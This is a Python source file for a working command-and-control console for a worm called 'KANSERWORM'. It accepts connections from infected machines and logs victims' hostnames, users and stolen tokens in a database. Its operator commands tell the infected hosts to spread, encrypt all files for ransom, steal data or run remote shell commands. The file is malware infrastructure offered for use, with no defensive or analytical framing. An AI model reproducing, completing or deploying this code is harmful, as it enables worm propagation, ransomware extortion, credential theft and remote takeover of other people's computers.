#!/usr/bin/env python3
import socket, threading, json, time, os, sys, base64, sqlite3
from datetime import datetime
R, G, Y, B, W = "\033[91m", "\033[92m", "\033[93m", "\033[94m", "\033[0m"
def clear(): os.system("cls")
def ts(): return datetime.now().strftime("%H:%M:%S")
C2_HOST, C2_PORT = "0.0.0.0", 7777
def enc(d): return base64.b64encode(d.encode()).decode()
def dec(d): return base64.b64decode(d).decode()

class WormCli:
    def __init__(self):
        self.worms, self.selected, self.running = {}, None, True
        self.db = sqlite3.connect("kanserworm.db", check_same_thread=False)
        self.db.execute("CREATE TABLE IF NOT EXISTS worms (id TEXT, hostname TEXT, ip TEXT, os TEXT, user TEXT, version TEXT, first TEXT, last TEXT, hosts_infected INTEGER)")
        self.db.execute("CREATE TABLE IF NOT EXISTS tokens (token TEXT, found_by TEXT, timestamp TEXT)")
        self.db.commit()
    def _srv(self):
        s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((C2_HOST, C2_PORT)); s.listen(5000)
        print(f"{G}[{ts()}] Worm C2 on {C2_HOST}:{C2_PORT}{W}")
        while self.running:
            try:
                s.settimeout(1); c, a = s.accept()
                threading.Thread(target=self._h, args=(c, a), daemon=True).start()
            except socket.timeout: continue
            except: break
        s.close()
    def _h(self, c, a):
        try:
            d = c.recv(8192).decode(errors="ignore"); msg = json.loads(dec(d))
        except: c.close(); return
        wid = msg.get("id","?"); info = msg.get("info", {})
        self.worms[wid] = {"conn":c,"addr":a[0],**info,"hosts":0,"last_seen":time.time()}
        self.db.execute("INSERT OR REPLACE INTO worms VALUES (?,?,?,?,?,?,datetime('now'),datetime('now'),0)", (wid, info.get("hostname",""), a[0], info.get("os",""), info.get("user",""), msg.get("version","")))
        self.db.commit()
        print(f"{G}[{ts()}] [+] WORM: {wid} ({a[0]}) {info.get('hostname','?')}{W}")
        buf = ""
        while self.running:
            try:
                c.settimeout(1); d = c.recv(65536).decode(errors="ignore")
                if not d: break
                buf += d
                try:
                    resp = json.loads(dec(buf)); buf = ""; tp = resp.get("type","")
                    if tp == "heartbeat":
                        self.worms[wid]["last_seen"] = time.time()
                        h = resp.get("hosts",0); self.worms[wid]["hosts"] = h
                        self.db.execute("UPDATE worms SET last_seen=datetime('now'), hosts_infected=? WHERE id=?",(h,wid)); self.db.commit()
                    elif tp == "shell": print(f"{B}[{wid}] {resp.get('data','')}{W}")
                    elif tp == "tokens_found":
                        for t in resp.get("data",[]): self.db.execute("INSERT INTO tokens VALUES (?,?,datetime('now'))",(t,wid))
                        self.db.commit(); print(f"{Y}[{wid}] Tokens: {len(resp.get('data',[]))}{W}")
                    elif tp == "screenshot": print(f"{G}[{ts()}] [SCREENSHOT] {wid}{W}")
                    elif tp == "ransom_done": print(f"{R}[{ts()}] [RANSOM] {wid} Key:{resp.get('key','?')}{W}")
                    elif tp == "stolen_data": print(f"{Y}[{wid}] Stolen: {len(resp.get('data',[]))} files{W}")
                except: pass
            except socket.timeout: continue
            except: break
        c.close()
        if wid in self.worms: del self.worms[wid]
        print(f"{R}[{ts()}] [-] WORM: {wid}{W}")
    def _send(self, wid, cmd, data=""):
        if wid in self.worms:
            try: self.worms[wid]["conn"].send(enc(json.dumps({"cmd":cmd,"data":data})).encode()); return True
            except: pass
        return False
    def _bcast(self, cmd, data=""):
        c = sum(1 for w in self.worms if self._send(w, cmd, data))
        print(f"{Y}[{ts()}] Broadcast {cmd} -> {c}/{len(self.worms)}{W}")
    def _cmd_loop(self):
        clear()
        print(f"{R}=== KANSERWORM C2 CLI v1.0 ==={W}")
        print("list | count | select <id> | spread | encrypt | steal | shell <wid> <cmd> | uninstall | exit\n")
        while self.running:
            try:
                raw = input(f"{G}WORM>{W} ").strip()
                if not raw: continue
                p = raw.split()
                if p[0] == "help": print("list | count | select <id> | spread | encrypt | steal | shell <wid> <cmd> | uninstall | exit")
                elif p[0] == "exit": self.running = False; break
                elif p[0] == "count":
                    total = sum(w.get("hosts",0) for w in self.worms.values())
                    print(f"{B}Worms: {len(self.worms)} | Infected: {total}{W}")
                elif p[0] == "list":
                    if not self.worms: print(f"{Y}No worms{W}")
                    else:
                        for wid, i in sorted(self.worms.items(), key=lambda x: x[1].get("last_seen",0), reverse=True):
                            mk = f"{R}*{W}" if wid == self.selected else " "
                            print(f"  {mk} {wid} | {i.get('addr','?')} | {i.get('hostname','?')} | hosts:{i.get('hosts',0)}")
                elif p[0] == "select" and len(p) > 1:
                    if p[1] in self.worms: self.selected = p[1]; print(f"{G}Selected: {p[1]}{W}")
                    else: print(f"{R}Not found: {p[1]}{W}")
                elif p[0] == "shell" and len(p) >= 3: self._send(p[1], "shell", raw.split(" ", 2)[2])
                elif p[0] == "spread": self._bcast("spread_now")
                elif p[0] == "encrypt": self._bcast("encrypt_all")
                elif p[0] == "steal": self._bcast("steal_all")
                elif p[0] == "uninstall": self._bcast("uninstall")
                else: print(f"{R}Unknown: {p[0]}{W}")
            except KeyboardInterrupt: self.running = False; break
            except: print(f"{R}Error{W}")
    def run(self):
        threading.Thread(target=self._srv, daemon=True).start()
        self._cmd_loop(); print(f"{Y}[{ts()}] Worm C2 stopped{W}")

if __name__ == "__main__":
    try: WormCli().run()
    except KeyboardInterrupt: pass
